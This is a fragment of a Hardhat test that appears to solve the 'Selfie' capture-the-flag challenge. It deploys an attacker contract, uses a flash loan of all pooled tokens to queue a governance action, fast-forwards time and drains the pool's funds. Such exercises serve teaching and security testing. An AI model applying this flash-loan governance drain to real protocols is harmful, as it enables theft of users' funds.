...
describe("[Challenge] Selfie", function () {
	...
	it("Exploit", async function () {
		const ReceiverFactory = await ethers.getContractFactory("FlashLoanReceive", attacker);
		this.receiver = await ReceiverFactory.deploy(
			this.pool.address,
			this.governance.address,
			this.token.address
		);
		...
		await this.receiver.attack(TOKENS_IN_POOL);
		console.log((await this.receiver.actionId()).toString());

		await ethers.provider.send("evm_increaseTime", [threeDays]);
		await ethers.provider.send("evm_mine");

		await this.receiver.drainFunds();
